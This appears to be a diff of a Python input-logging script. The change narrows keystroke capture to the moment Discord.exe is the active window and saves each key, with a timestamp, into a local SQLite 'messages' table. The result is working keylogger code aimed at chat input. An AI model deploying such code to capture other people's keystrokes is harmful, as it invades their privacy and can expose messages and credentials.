@@ -6,26 +6,28 @@ import win32gui
 import win32process
 import time
 import threading
+import sqlite3
 # Create an empty DataFrame with columns "Time" and "Button"
 df = pd.DataFrame(columns=["Time", "Button", "Process"])
 last_input_time = time.time()
 timeout = 3  # Seconds before inserting "/"
 stop_event = threading.Event()
+DB_PATH = "Database.db"
 
-button_replacements = {
-    "Button.left": "LC",  # Change left click to "LC"
-    "Button.right": "RC",  # Change right click to "RC"
-    "Key.space": " ",
-    "Key.enter": "Enter",
-    "Key.tab":"Tab",
-    "Key.backspace": "<-",
-    "Key.ctrl_l": "CTRL",
-    "Key.alt_l": "alt",
-    "Key.shift": "SH",
-    "Button.x1": "M1",
-    "Button.middle": "mid",
-    "Key.esc": "esc"
-}
+# button_replacements = {
+#     "Button.left": "LC",  # Change left click to "LC"
+#     "Button.right": "RC",  # Change right click to "RC"
+#     "Key.space": " ",
+#     "Key.enter": "Enter",
+#     "Key.tab":"Tab",
+#     "Key.backspace": "<-",
+#     "Key.ctrl_l": "CTRL",
+#     "Key.alt_l": "alt",
+#     "Key.shift": "SH",
+#     "Button.x1": "M1",
+#     "Button.middle": "mid",
+#     "Key.esc": "esc"
+# }
 # Function to log key presses with the time and key/button name
 def get_active_window():
     try:
@@ -39,29 +41,28 @@ def get_active_window():
 buffer = []
 csv_file = "input_log.csv"
 held_keys = set()
-def transform_button_name(button):
-    return button_replacements.get(button, button)
+# def transform_button_name(button):
+#     return button_replacements.get(button, button)
 # Function to log key presses
 def on_key_press(key):
-    global held_keys
-    try:
-        button = key.char
-    except AttributeError:
-        button = str(key)
-    button = transform_button_name(button)
-
-    if button not in held_keys:
-        held_keys.add(button)
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        process = get_active_window()
-        log_entry = [timestamp, button, process]
-        buffer.append(log_entry)
-
-        # If Enter is pressed, flush the buffer to CSV
-        if button == 'Enter':
-            df = pd.DataFrame(buffer, columns=["Time", "Button", "Process"])
-            df.to_csv(csv_file, mode='a', header=not pd.io.common.file_exists(csv_file), index=False)
-            buffer.clear()
+    if get_active_window() == "Discord.exe":
+        global held_keys
+        try:
+            button = key.char
+        except AttributeError:
+            button = str(key)
+        if button not in held_keys:
+            held_keys.add(button)
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with sqlite3.connect(DB_PATH) as conn:
+                conn.execute('''
+                            CREATE TABLE IF NOT EXISTS messages (
+                                timestamp TEXT,
+                                message TEXT
+                            )
+                        ''')
+                conn.execute('INSERT INTO messages (timestamp, message) VALUES (?, ?)', (timestamp, button))
+                conn.commit()
 
 def on_key_release(key):
     global held_keys
@@ -69,7 +70,6 @@ def on_key_release(key):
         button = key.char
     except AttributeError:
         button = str(key)
-    button = transform_button_name(button)
     if button in held_keys:
         held_keys.remove(button)
 
@@ -79,7 +79,7 @@ def on_click(x, y, button, pressed):
     if pressed:
         program = get_active_window()
         button_name = str(button)  # Get the button name
-        button_name = transform_button_name(button_name)
+        #button_name = transform_button_name(button_name)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current time
         global df
         # Append new entry to the dataframe
@@ -97,3 +97,6 @@ mouse_listener.start()
 
 keyboard_listener.join()
 mouse_listener.join()
+
+conn = sqlite3.connect('Database.db')
+cursor = conn.cursor()
